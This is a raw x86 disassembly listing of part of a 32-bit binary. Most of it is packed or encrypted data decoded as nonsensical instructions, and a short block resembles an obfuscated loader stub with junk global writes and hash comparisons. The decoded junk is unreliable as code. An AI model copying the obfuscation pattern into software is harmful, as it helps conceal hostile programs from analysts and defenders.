  4138aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ab:	push   esp
  4138ac:	int3   
  4138ad:	fptan  
  4138af:	push   0xe21398cf
  4138b4:	sti    
  4138b5:	dec    eax
  4138b6:	pop    es
  4138b7:	add    ecx,ebx
  4138b9:	mov    eax,0x7bc1d8a1
  4138be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138bf:	add    ch,ah
  4138c1:	jns    0x4138cc
  4138c3:	inc    ebp
  4138c4:	test   eax,0x4bb821f1
  4138c9:	iret   
  4138ca:	out    0xc,al
  4138cc:	add    eax,0xe8280923
  4138d1:	dec    edx
  4138d2:	mov    bl,dl
  4138d4:	cwde   
  4138d5:	adc    eax,0xfd39542a
  4138da:	outs   dx,BYTE PTR ds:[esi]
  4138db:	imul   esp,DWORD PTR [eax],0x78
  4138de:	inc    ebx
  4138df:	mov    ebx,0x8cc8a6c3
  4138e4:	loopne 0x4138fa
  4138e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138e7:	and    dh,BYTE PTR [edx]
  4138e9:	or     eax,0xf61886f7
  4138ee:	and    BYTE PTR [edx-0x2471f022],ch
  4138f4:	push   0xffffffac
  4138f6:	jmp    0x8511:0x1a90df1f
  4138fd:	call   0xfb86:0xb0675f36
  413904:	and    BYTE PTR [eax-0x28],dl
  413907:	pop    esi
  413908:	(bad)  
  413909:	inc    ebp
  41390a:	fsubr  DWORD PTR [edx]
  41390c:	outs   dx,BYTE PTR ds:[esi]
  41390d:	inc    ebx
  41390e:	jge    0x4138a9
  413910:	jmp    0x1ded:0x238f6e67
  413917:	lahf   
  413918:	xchg   edx,eax
  413919:	and    ch,al
  41391b:	cmp    ch,0x1b
  41391e:	sbb    BYTE PTR [ebx+0x48341f9d],al
  413924:	shl    BYTE PTR [ecx-0x4c],cl
  413927:	cmp    al,0xd5
  413929:	or     esp,DWORD PTR [edi+0x490b7a0a]
  41392f:	or     al,0xd8
  413931:	or     eax,0x8cbbab55
  413936:	mov    esp,0x6d0eb8ce
  41393b:	adc    eax,0x7ceb4e
  413940:	sbb    eax,0x8ec832ca
  413945:	dec    eax
  413946:	adc    ecx,DWORD PTR [edx-0x60]
  413949:	adc    BYTE PTR [ecx],0xbd
  41394c:	fcom   QWORD PTR [ebp-0x72]
  41394f:	push   es
  413950:	cli    
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	popf   
  413953:	cmp    al,0xdc
  413955:	(bad)  
  413956:	rcl    BYTE PTR [edx],cl
  413958:	ffreep st(2)
  41395a:	ds cdq 
  41395c:	mov    ecx,0xa0e18dc1
  413961:	add    dl,BYTE PTR [ebp-0x2def0cb3]
  413967:	in     eax,0x8b
  413969:	test   esi,eax
  41396b:	pop    edx
  41396c:	fld    QWORD PTR ss:[ecx]
  41396f:	aad    0x78
  413971:	or     eax,0xaae0c1ac
  413976:	mov    ebx,0xb7686994
  41397b:	xchg   ebx,eax
  41397c:	or     ebp,DWORD PTR [ebx+0x43]
  41397f:	adc    al,0x82
  413981:	mov    bl,cl
  413983:	hlt    
  413984:	lock or al,0xa1
  413987:	push   edx
  413988:	stos   BYTE PTR es:[edi],al
  413989:	sar    DWORD PTR [eax+0xf6c86c3],0x50
  413990:	iret   
  413991:	inc    edi
  413992:	lock sbb edi,DWORD PTR [eax]
  413995:	push   ss
  413996:	in     al,dx
  413997:	pop    ecx
  413998:	popf   
  413999:	mov    WORD PTR fs:[ecx+0x5c6e666f],ds
  4139a0:	mov    ch,0xaa
  4139a2:	xlat   BYTE PTR ds:[ebx]
  4139a3:	icebp  
  4139a4:	jnp    0x41394b
  4139a6:	leave  
  4139a7:	sbb    eax,0x6de9c001
  4139ac:	fild   QWORD PTR [eax+0x2c6dcbdd]
  4139b3:	sub    BYTE PTR [esi+edi*2],0xf5
  4139b7:	xchg   cl,bl
  4139b9:	xor    al,0xd3
  4139bb:	push   edi
  4139bc:	adc    esi,DWORD PTR [edx+esi*8+0x777302b0]
  4139c3:	lods   eax,DWORD PTR ds:[esi]
  4139c4:	std    
  4139c5:	mov    edx,0x4d67a4a9
  4139ca:	xor    ecx,ecx
  4139cc:	jge    0x4139d4
  4139ce:	add    eax,DWORD PTR [esi+edi*4]
  4139d1:	and    DWORD PTR [eax-0x7985dc5d],0x78
  4139d8:	into   
  4139d9:	jmp    0x921797b1
  4139de:	(bad)  [edx-0x65]
  4139e1:	cwde   
  4139e2:	out    dx,al
  4139e3:	or     bl,bh
  4139e5:	out    dx,eax
  4139e6:	mov    bh,0xc2
  4139e8:	xor    al,0x8b
  4139ea:	mov    bh,0x42
  4139ec:	pop    esi
  4139ed:	pop    edx
  4139ee:	mov    BYTE PTR [eax+0x51],ah
  4139f1:	out    0x3a,eax
  4139f3:	jo     0x4139b1
  4139f5:	retf   
  4139f6:	mov    edi,0x807e61ba
  4139fb:	inc    edx
  4139fc:	inc    edi
  4139fd:	xor    ebp,DWORD PTR [edi+0x714b593f]
  413a03:	out    dx,eax
  413a04:	xchg   dh,bh
  413a06:	cmp    bh,cl
  413a08:	mov    ebx,0xb57f18bd
  413a0d:	xchg   esi,eax
  413a0e:	pop    edi
  413a0f:	test   al,0x6
  413a11:	lods   eax,DWORD PTR ds:[esi]
  413a12:	lahf   
  413a13:	shr    BYTE PTR [ecx+0x60a9ce8e],cl
  413a19:	frstor [edi]
  413a1b:	imul   esi,DWORD PTR [edi],0xdfe2cb11
  413a21:	sbb    BYTE PTR [ecx-0x54],0xb2
  413a25:	xchg   DWORD PTR [edx],ebp
  413a27:	ffree  st(1)
  413a29:	retf   
  413a2a:	(bad)  ds:0xd2619081
  413a30:	shl    ah,cl
  413a32:	pop    eax
  413a33:	add    DWORD PTR [eax-0x29d10349],edi
  413a39:	xchg   esp,eax
  413a3a:	cmp    al,BYTE PTR [esi]
  413a3c:	fnstcw WORD PTR [eax+0x40]
  413a3f:	fbld   TBYTE PTR [ebx]
  413a41:	lods   eax,DWORD PTR ds:[esi]
  413a42:	pop    edi
  413a43:	std    
  413a44:	xor    DWORD PTR [ebp-0x33],edx
  413a47:	inc    eax
  413a48:	mov    gs,ebp
  413a4a:	push   edx
  413a4b:	stos   BYTE PTR es:[edi],al
  413a4c:	sub    eax,0x4310311b
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	test   eax,0x7ef4a3cb
  413a6c:	push   0x7eb97070
  413a71:	jo     0x413ae3
  413a73:	dec    esp
  413a74:	enter  0xf221,0xe2
  413a78:	std    
  413a79:	sti    
  413a7a:	stc    
  413a7b:	mov    ch,0x63
  413a7d:	pop    esi
  413a7e:	sbb    al,0xeb
  413a80:	(bad)  
  413a81:	mov    ah,BYTE PTR [edx]
  413a83:	jmp    0x413a42
  413a85:	fimul  WORD PTR [ecx]
  413a87:	or     DWORD PTR [edi+0x5920bcfe],esp
  413a8d:	or     BYTE PTR [edi],bh
  413a8f:	aaa    
  413a90:	clc    
  413a91:	cli    
  413a92:	jl     0x413a5f
  413a94:	cld    
  413a95:	stos   BYTE PTR es:[edi],al
  413a96:	sqrtps xmm0,XMMWORD PTR [eax]
  413a99:	lods   al,BYTE PTR ds:[esi]
  413a9a:	mov    ?,WORD PTR [edx-0x2b]
  413a9d:	cmp    edx,DWORD PTR [eax+0x51c3711d]
  413aa3:	test   eax,0x335210c8
  413aa8:	xor    BYTE PTR [ebp+0x63ef41cc],dh
  413aae:	jns    0x413a57
  413ab0:	xchg   esp,eax
  413ab1:	scas   al,BYTE PTR es:[edi]
  413ab2:	sbb    eax,DWORD PTR [edi-0x55]
  413ab5:	mov    dl,0xc2
  413ab7:	sar    esp,0xed
  413aba:	scas   eax,DWORD PTR es:[edi]
  413abb:	retf   0x45cd
  413abe:	out    dx,al
  413abf:	(bad)  
  413ac0:	jno    0x413a4a
  413ac2:	mov    ah,0x1c
  413ac4:	(bad)  
  413ac5:	jbe    0x413b21
  413ac7:	cld    
  413ac8:	and    eax,0x5c74701f
  413acd:	sub    BYTE PTR [ecx+0x7eace201],al
  413ad3:	test   BYTE PTR [eax-0x45],dh
  413ad6:	xchg   ebp,eax
  413ad7:	test   DWORD PTR [ebp+0x79cc7d6d],edx
  413add:	in     eax,dx
  413ade:	out    dx,al
  413adf:	jno    0x413b5c
  413ae1:	loop   0x413b54
  413ae3:	push   cs
  413ae4:	arpl   WORD PTR [edi],dx
  413ae6:	mul    bl
  413ae8:	push   esp
  413ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413aea:	rol    DWORD PTR [ecx],0x23
  413aed:	cmp    bh,BYTE PTR [ecx+0x4e890cc6]
  413af3:	pusha  
  413af4:	jnp    0x413acb
  413af6:	(bad)  
  413af7:	clc    
  413af8:	pushf  
  413af9:	hlt    
  413afa:	imul   ebp,DWORD PTR [ebx+esi*4+0xff8155c],0x1bde0a19
  413b05:	add    eax,0x43a153ed
  413b0a:	pusha  
  413b0b:	dec    esp
  413b0c:	in     al,dx
  413b0d:	adc    al,0xd6
  413b0f:	inc    esp
  413b10:	push   esi
  413b11:	fwait
  413b12:	cdq    
  413b13:	pop    esi
  413b14:	mov    BYTE PTR [edx+0x175c7373],bl
  413b1a:	addr16 sar ebx,cl
  413b1d:	or     eax,0x3031d165
  413b22:	scas   eax,DWORD PTR es:[edi]
  413b23:	repnz adc BYTE PTR [edi+0x4d],bl
  413b27:	iret   
  413b28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b29:	mov    BYTE PTR [edx],cl
  413b2b:	fnstcw WORD PTR [edx]
  413b2d:	adc    ah,BYTE PTR [esi-0x14]
  413b30:	daa    
  413b31:	stos   BYTE PTR es:[edi],al
  413b32:	lea    bx,[ebx+0x71a7a039]
  413b39:	call   0xce81dbda
  413b3e:	inc    edx
  413b3f:	pop    ebx
  413b40:	ret    0xeee7
  413b43:	fbld   TBYTE PTR [esi-0x37]
  413b46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b47:	cmp    ch,cl
  413b49:	int    0x31
  413b4b:	sub    ch,BYTE PTR [eax+0x2e]
  413b4e:	mov    bl,0xa9
  413b50:	inc    esi
  413b51:	cmp    edi,DWORD PTR [edx-0x2a8cef2e]
  413b57:	pop    edi
  413b58:	push   ebp
  413b59:	ds lahf 
  413b5b:	rcl    BYTE PTR [ebx],1
  413b5d:	repz ror BYTE PTR [ebx-0x57],1
  413b61:	xor    al,dh
  413b63:	ins    DWORD PTR es:[edi],dx
  413b64:	push   eax
  413b65:	pop    edi
  413b66:	xor    al,0x92
  413b68:	test   DWORD PTR [ebx-0xa],ecx
  413b6b:	xchg   esp,eax
  413b6c:	retf   0x1a23
  413b6f:	mov    esp,0x67e93f6d
  413b74:	sbb    ah,al
  413b76:	test   BYTE PTR [eax],dh
  413b78:	imul   BYTE PTR [edx]
  413b7a:	sar    DWORD PTR [eax-0x79],1
  413b7d:	or     ah,BYTE PTR [edx+0x6c7e4040]
  413b83:	and    ch,BYTE PTR [edx-0x5de405cc]
  413b89:	lock in al,0xdb
  413b8c:	lds    eax,FWORD PTR [esi]
  413b8e:	sub    DWORD PTR [ebx-0x65],esp
  413b91:	stos   DWORD PTR es:[edi],eax
  413b92:	arpl   WORD PTR [edx-0x18316e62],cx
  413b98:	mov    eax,ds:0xa49bbc3e
  413b9d:	mov    dh,0xb4
  413ba0:	das    
  413ba1:	dec    ecx
  413ba2:	mov    eax,0x3f3c7e41
  413ba7:	mov    BYTE PTR [ebp+0x34],dh
  413baa:	into   
  413bab:	sbb    al,0x8e
  413bad:	cmp    al,0xd3
  413baf:	adc    ebx,DWORD PTR [eax+ebx*4+0x75337f94]
  413bb6:	sub    BYTE PTR [ecx],ch
  413bb8:	xlat   BYTE PTR ds:[ebx]
  413bb9:	add    bl,BYTE PTR [ebp+0x7]
  413bbc:	test   DWORD PTR [ebx-0x659fdfc6],ecx
  413bc2:	(bad)  
  413bc3:	push   edx
  413bc4:	sbb    eax,0x97cd4546
  413bc9:	xlat   BYTE PTR ds:[ebx]
  413bca:	inc    eax
  413bcb:	pop    ds
  413bcc:	ja     0x413b72
  413bce:	jns    0x413c38
  413bd0:	jnp    0x413c4d
  413bd2:	arpl   WORD PTR [eax],bp
  413bd4:	(bad)  
  413bd5:	std    
  413bd6:	adc    DWORD PTR [edx+0x247c497b],edi
  413bdc:	out    0xa9,eax
  413bde:	add    bl,dl
  413be0:	js     0x413bd2
  413be2:	(bad)  
  413be4:	bound  edi,QWORD PTR [eax-0x5c93b735]
  413bea:	int    0x76
  413bec:	mov    esi,0xd818abb
  413bf1:	add    ecx,DWORD PTR [edi+0x7f]
  413bf4:	add    esp,DWORD PTR [ecx]
  413bf6:	push   edx
  413bf7:	xor    ch,BYTE PTR [ecx+0x29]
  413bfa:	les    ecx,FWORD PTR ds:0x8a2b7fa5
  413c00:	or     dl,bl
  413c02:	pusha  
  413c03:	and    eax,0x9fe4a4f4
  413c08:	out    0x17,al
  413c0a:	fstp   DWORD PTR [edx]
  413c0c:	test   eax,0xcd9be06d
  413c11:	add    DWORD PTR [ebx],esi
  413c13:	rcr    eax,1
  413c15:	sbb    BYTE PTR [esi-0x5a],cl
  413c18:	mov    ds:0xda0e6987,al
  413c1d:	adc    ch,bh
  413c1f:	outs   dx,BYTE PTR ds:[esi]
  413c20:	sbb    esp,edi
  413c22:	inc    esp
  413c23:	ja     0x413c9c
  413c25:	repnz int 0x48
  413c28:	inc    esi
  413c29:	loop   0x413c20
  413c2b:	retf   
  413c2c:	dec    DWORD PTR [edi]
  413c2e:	jge    0x413c51
  413c30:	out    dx,eax
  413c31:	cwde   
  413c32:	dec    DWORD PTR [ebx]
  413c34:	sti    
  413c35:	xor    esp,DWORD PTR gs:[eax+edx*4+0x4e60c29f]
  413c3d:	add    bl,BYTE PTR [edx]
  413c3f:	rcl    bl,cl
  413c41:	scas   eax,DWORD PTR es:[edi]
  413c42:	push   ebp
  413c43:	cli    
  413c44:	add    edi,DWORD PTR [ebp+0x64c21ecb]
  413c4a:	fs xchg edx,eax
  413c4c:	in     eax,dx
  413c4d:	push   eax
  413c4e:	and    DWORD PTR [edi],esp
  413c50:	jge    0x413c82
  413c52:	dec    eax
  413c53:	pop    ecx
  413c54:	xchg   esi,eax
  413c55:	cld    
  413c56:	jne    0x413c4c
  413c58:	xor    eax,esi
  413c5a:	mov    al,ds:0x8f57c820
  413c5f:	loop   0x413c26
  413c61:	(bad)  [ebx]
  413c63:	int3   
  413c64:	pop    esi
  413c65:	dec    DWORD PTR [edx+0x4f]
  413c68:	adc    eax,0x34f2fd76
  413c6d:	mov    esi,0xb7c67b7d
  413c72:	lods   al,BYTE PTR ds:[esi]
  413c73:	rcl    BYTE PTR [ecx+eax*8],0x73
  413c77:	jle    0x413cc8
  413c79:	mov    ebp,0x8b7c5c8e
  413c7e:	in     al,dx
  413c7f:	jmp    0x18ede4b7
  413c84:	and    al,0x1a
  413c86:	and    edi,DWORD PTR [edx-0x655c0809]
  413c8c:	push   ebp
  413c8d:	mov    ds:0x67765675,al
  413c92:	fwait
  413c93:	cs in  al,dx
  413c95:	or     bl,BYTE PTR [ebx+0x1a]
  413c98:	loop   0x413c89
  413c9a:	cmp    bh,BYTE PTR [ebx-0x240d595a]
  413ca0:	push   ecx
  413ca1:	and    DWORD PTR [edi],ecx
  413ca3:	mov    al,0xf1
  413ca5:	in     al,dx
  413ca6:	popf   
  413ca7:	lods   eax,DWORD PTR ds:[esi]
  413ca8:	adc    ch,dh
  413caa:	lods   al,BYTE PTR ds:[esi]
  413cab:	or     eax,0x17ea117b
  413cb0:	into   
  413cb1:	xchg   ecx,eax
  413cb2:	xchg   ebx,eax
  413cb3:	pop    ds
  413cb4:	fldl2e 
  413cb6:	cmp    ebx,DWORD PTR [edi]
  413cb8:	xlat   BYTE PTR ds:[ebx]
  413cb9:	in     al,dx
  413cba:	pop    ebx
  413cbb:	adc    eax,DWORD PTR [eax+0x4b61f734]
  413cc1:	leave  
  413cc2:	test   dh,dl
  413cc4:	jecxz  0x413d10
  413cc6:	fwait
  413cc7:	sahf   
  413cc8:	mov    al,ds:0x87124c22
  413ccd:	repnz sbb eax,esp
  413cd0:	outs   dx,DWORD PTR ds:[esi]
  413cd1:	mov    eax,ds:0x6c7d46a0
  413cd6:	adc    al,0xbd
  413cd8:	adc    dl,bl
  413cda:	outs   dx,DWORD PTR ds:[esi]
  413cdb:	mov    ah,0x7f
  413cdd:	and    DWORD PTR [edi-0x22],edi
  413ce0:	loopne 0x413cb5
  413ce2:	mov    bl,0x61
  413ce4:	aas    
  413ce5:	adc    dl,BYTE PTR [ecx-0xf]
  413ce8:	push   ds
  413ce9:	pop    ss
  413cea:	pop    edi
  413ceb:	retf   0xcb25
  413cee:	js     0x413d14
  413cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cf1:	or     bl,BYTE PTR [ecx]
  413cf3:	cmp    edi,DWORD PTR [edx-0x3]
  413cf6:	xchg   BYTE PTR [ebp+0x231d98c2],bl
  413cfc:	out    0x83,al
  413cfe:	loop   0x413cea
  413d00:	(bad)  
  413d01:	dec    edx
  413d02:	inc    ebx
  413d03:	xor    eax,0xc1a9b62
  413d08:	fwait
  413d09:	jge    0x413d1c
  413d0b:	sbb    al,dh
  413d0d:	call   0xf78d:0x5e820ba1
  413d14:	cwde   
  413d15:	int    0x95
  413d17:	lock and al,0x85
  413d1a:	les    esp,FWORD PTR [ecx+0x19]
  413d1d:	rol    BYTE PTR [ebx+edi*1+0x2132c8dd],1
  413d24:	and    dh,ah
  413d26:	loop   0x413cf7
  413d28:	hlt    
  413d29:	xchg   ebp,eax
  413d2a:	xor    DWORD PTR [esi],0x6c
  413d2d:	dec    edx
  413d2e:	fnstenv [edi-0x36]
  413d31:	retf   0x6b5f
  413d34:	test   DWORD PTR [edi],0xbbc4524b
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	push   ds
  413e8c:	popf   
  413e8d:	jmp    DWORD PTR [eax+0x70707647]
  413e93:	mov    ecx,0xbf70707e
  413e98:	clc    
  413e99:	(bad)  
  413e9a:	xchg   edi,eax
  413e9b:	push   edi
  413e9c:	inc    ecx
  413e9d:	aam    0xf5
  413e9f:	arpl   cx,di
  413ea1:	ds jl  0x413edb
  413ea4:	xchg   esp,eax
  413ea5:	cli    
  413ea6:	xchg   DWORD PTR [edx],edi
  413ea8:	push   esp
  413ea9:	repnz inc esi
  413eab:	xchg   ebx,eax
  413eac:	pop    edx
  413ead:	retf   
  413eae:	mov    WORD PTR [ecx+0xd],ds
  413eb1:	fsubr  QWORD PTR [edx]
  413eb3:	xlat   BYTE PTR ds:[ebx]
  413eb4:	cmp    bl,0x60
  413eb7:	xchg   BYTE PTR [esi+0x68626be7],cl
  413ebd:	in     eax,dx
  413ebe:	test   dh,0x10
  413ec1:	pop    ss
  413ec2:	test   DWORD PTR [eax-0x6d3c55ba],esp
  413ec8:	dec    ebp
  413ec9:	ja     0x413ed1
  413ecb:	mov    ebp,0x6481256b
  413ed0:	dec    eax
  413ed1:	pop    ebp
  413ed2:	mov    ebp,0x3719d901
  413ed7:	mov    DWORD PTR [ebx-0x7],eax
  413eda:	mov    ebp,ebx
  413edc:	add    BYTE PTR [edi-0xc303a20],0x3e
  413ee3:	xchg   DWORD PTR [edi+0x77],ecx
  413ee6:	mov    eax,0x376c19d1
  413eeb:	dec    ecx
  413eec:	adc    dl,BYTE PTR [edi-0x14fa190]
  413ef2:	xchg   BYTE PTR [eax-0x72],ch
  413ef5:	or     BYTE PTR [ebx+0x1eade05b],bh
  413efb:	in     al,dx
  413efc:	inc    ebp
  413efd:	jbe    0x413f6d
  413eff:	jno    0x413ec9
  413f01:	iret   
  413f02:	add    DWORD PTR [edx+0x3c64bbe6],0xc3aefa8a
  413f0c:	test   eax,0x26630820
  413f11:	push   esi
  413f12:	in     al,0x98
  413f14:	int3   
  413f15:	inc    esp
  413f16:	jno    0x413ebf
  413f18:	sub    cl,dl
  413f1a:	std    
  413f1b:	jnp    0x413f55
  413f1d:	mov    bh,0xd4
  413f1f:	push   0xe52d5f0d
  413f24:	jne    0x413f77
  413f26:	dec    edx
  413f27:	pop    ebx
  413f28:	lahf   
  413f29:	jmp    0x413f92
  413f2b:	add    al,0x62
  413f2d:	aaa    
  413f2e:	pop    edx
  413f2f:	stos   DWORD PTR es:[edi],eax
  413f30:	ror    BYTE PTR [edx],1
  413f32:	test   ebx,edx
  413f34:	sub    DWORD PTR [ebx+0x5c],esp
  413f37:	lods   al,BYTE PTR ds:[esi]
  413f38:	in     eax,dx
  413f39:	std    
  413f3a:	add    DWORD PTR [eax],ecx
  413f3c:	lods   eax,DWORD PTR ds:[esi]
  413f3d:	lea    ebp,[ebx-0x6872606]
  413f43:	jmp    0x413efe
  413f45:	ret    0x6d0e
  413f48:	mov    bl,0x29
  413f4a:	stc    
  413f4b:	aaa    
  413f4c:	pop    ss
  413f4d:	mov    esp,0x4f6a0dbc
  413f52:	jmp    0x28b8:0x51713cbe
  413f59:	sbb    DWORD PTR [ecx],ebx
  413f5b:	push   edx
  413f5c:	xor    bl,al
  413f5e:	mov    ah,0xbf
  413f60:	rol    BYTE PTR [ecx-0x2ce8e169],1
  413f66:	mov    eax,ds:0x86973f86
  413f6b:	fnstenv [esp+ecx*8+0x42]
  413f6f:	sub    cl,BYTE PTR [eax]
  413f71:	shr    ebx,cl
  413f73:	mov    ah,0x76
  413f75:	clc    
  413f76:	out    0xb5,eax
  413f78:	inc    edi
  413f79:	and    BYTE PTR es:[esi-0x1],ah
  413f7d:	sub    dl,BYTE PTR [esi]
  413f7f:	jnp    0x413f33
  413f81:	xor    ch,ch
  413f83:	in     al,0x12
  413f85:	jnp    0x413f5c
  413f87:	push   edi
  413f88:	jmp    0x413fe5
  413f8a:	jo     0x413fe7
  413f8c:	add    eax,0x8cc9e8c1
  413f91:	rol    BYTE PTR [ebp+0x3f21fddc],cl
  413f97:	adc    BYTE PTR [esp+eiz*8],ah
  413f9a:	inc    edi
  413f9b:	leave  
  413f9c:	dec    ebp
  413f9d:	add    al,BYTE PTR ds:0x249ab5e8
  413fa3:	je     0x414020
  413fa5:	cmp    DWORD PTR [edx],esp
  413fa7:	in     al,dx
  413fa8:	or     ch,BYTE PTR [ecx]
  413faa:	div    dl
  413fac:	mov    esp,0x68253b73
  413fb1:	mov    ebx,0x304caedc
  413fb6:	test   bl,ah
  413fb8:	ret    0x590c
  413fbb:	outs   dx,DWORD PTR ds:[esi]
  413fbc:	xchg   esi,eax
  413fbd:	hlt    
  413fbe:	mov    DWORD PTR [esi+ebp*1],eax
  413fc1:	xor    DWORD PTR [ecx-0x13d47f62],ecx
  413fc7:	inc    edx
  413fc8:	dec    esp
  413fc9:	or     eax,0x7e21f05b
  413fce:	add    ebx,ebp
  413fd0:	retf   
  413fd1:	in     eax,dx
  413fd2:	pusha  
  413fd3:	and    dh,BYTE PTR [ecx]
  413fd5:	sahf   
  413fd6:	jmp    0x91660b9d
  413fdb:	pop    ss
  413fdc:	cmp    BYTE PTR [ebp-0x4085afc4],ah
  413fe2:	cs (bad) 
  413fe4:	fisttp DWORD PTR [edx]
  413fe6:	stc    
  413fe7:	xor    eax,0x3272d9d4
  413fec:	adc    BYTE PTR [esi-0x32a6c703],cl
  413ff2:	push   esp
  413ff3:	dec    edi
  413ff4:	js     0x413fad
  413ff6:	lods   al,BYTE PTR ds:[esi]
  413ff7:	(bad)  
  413ff8:	jnp    0x413fba
  413ffa:	jno    0x413ff0
  413ffc:	fstp   TBYTE PTR [ebp-0x3e]
  413fff:	pop    edi
  414000:	test   eax,0x77dfaabb
  414005:	jecxz  0x414070
  414007:	in     al,0x2e
  414009:	jbe    0x41406d
  41400b:	call   0x888cbb7
  414010:	sub    ah,dh
  414012:	je     0x41401d
  414014:	add    al,0x89
  414016:	cmp    BYTE PTR [ebp+0x213c81a6],0x32
  41401d:	test   al,0x66
  41401f:	fdivr  DWORD PTR [edx]
  414021:	jb     0x413fc9
  414023:	mov    esp,0x550c6a71
  414028:	nop
  414029:	xlat   BYTE PTR ds:[ebx]
  41402a:	(bad)  
  41402b:	mov    dh,0x99
  41402d:	or     ebx,esi
  41402f:	xchg   DWORD PTR [ecx+0x54f599ed],esi
  414035:	leave  
  414036:	loop   0x413fee
  414038:	xlat   BYTE PTR ds:[ebx]
  414039:	in     al,dx
  41403a:	int3   
  41403b:	mov    edi,0x9243033
  414040:	push   0xffffff87
  414042:	push   DWORD PTR [esi+ebp*4+0x35]
  414046:	cli    
  414047:	fst    st(1)
  414049:	adc    ebp,esp
  41404b:	sbb    eax,DWORD PTR [ebp+0x489c0220]
  414051:	in     eax,dx
  414052:	xchg   BYTE PTR [ebp+0x60573448],bl
  414058:	dec    edx
  414059:	add    bl,BYTE PTR [eax+0x1080734f]
  41405f:	mov    DWORD PTR [edi+0x388839b3],edx
  414065:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  414067:	enter  0x1b17,0x9d
  41406b:	mov    ds:0x16593f4,al
  414070:	jle    0x41408d
  414072:	lds    ecx,FWORD PTR [ebx-0x1c]
  414075:	jae    0x4140dc
  414077:	pushf  
  414078:	ins    DWORD PTR es:[edi],dx
  414079:	bound  ebx,QWORD PTR [edx-0x7d]
  41407c:	cmp    ebx,DWORD PTR [eax-0x71]
  41407f:	dec    edi
  414080:	lds    esi,FWORD PTR [ecx]
  414082:	into   
  414083:	les    ebx,FWORD PTR [ebx]
  414085:	iret   
  414086:	(bad)  
  414087:	(bad)  
  414088:	xchg   edx,eax
  414089:	xchg   edx,eax
  41408a:	xor    al,BYTE PTR [edi]
  41408c:	stos   DWORD PTR es:[edi],eax
  41408d:	ds xchg edx,eax
  41408f:	cwde   
  414090:	xor    BYTE PTR [eax-0x3888dd],dh
  414096:	dec    esi
  414097:	push   ecx
  414098:	jnp    0x4140fa
  41409a:	mov    ah,0x94
  41409c:	ins    BYTE PTR es:[edi],dx
  41409d:	adc    edx,DWORD PTR [esi+0x5e22d251]
  4140a3:	push   0xb8206c60
  4140a8:	and    al,0x61
  4140aa:	leave  
  4140ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
